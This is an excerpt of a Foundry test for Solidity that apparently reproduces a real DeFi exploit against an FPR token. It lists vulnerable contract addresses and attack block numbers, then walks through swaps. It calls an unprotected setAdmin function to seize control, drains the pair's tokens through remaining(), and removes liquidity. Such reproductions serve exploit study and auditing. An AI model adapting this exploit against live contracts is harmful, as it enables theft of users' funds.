...
contract ContractTest is Test {
    address[4] vulContracts = [0x81c5664be54d89E725ef155F14cf34e6213297B7,0xE2f0A9B60858f436e1f74d8CdbE03625b9bcc532,0x39eb555f5F7AFd11224ca10E406Dba05B4e21BD3,0xBa5B235CDDaAc2595bcE6BaB79274F57FB82Bf27];
    uint[3] attackBlock = [23904153, 23904166, 23904174];
    ...
    function testExploit() public {
        ...
        for (uint i = 0; i < 3; i++) {
            ...
            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(FPR.balanceOf(address(this)), 0, path, address(this), block.timestamp);
        }

        VulContract(vulContracts[3]).setAdmin(address(this));
        VulContract(vulContracts[3]).remaining(address(this), address(pair));
        router.removeLiquidity(address(USDT), address(FPR), pair.balanceOf(address(this)), 0, 0, address(this), block.timestamp);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(FPR.balanceOf(address(this)), 0, path, address(this), block.timestamp);
    }
